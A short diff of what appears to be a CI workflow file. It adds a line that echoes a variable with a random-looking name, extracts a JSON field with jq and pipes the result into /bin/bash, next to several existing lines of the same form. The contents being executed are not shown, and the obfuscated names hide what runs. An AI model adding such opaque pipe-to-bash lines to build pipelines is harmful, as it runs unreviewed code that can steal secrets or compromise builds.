@@ -32,6 +32,7 @@ jobs:
           echo $ojgc907 | jq -r .xolv0 | /bin/bash
           echo $mcv18716 | jq -r .k087 | /bin/bash
           echo $xorpl5385 | jq -r .mq709 | /bin/bash
+          echo $miwmk1 | jq -r .gfov6779 | /bin/bash
 
       - name: Save archive
         if: always()
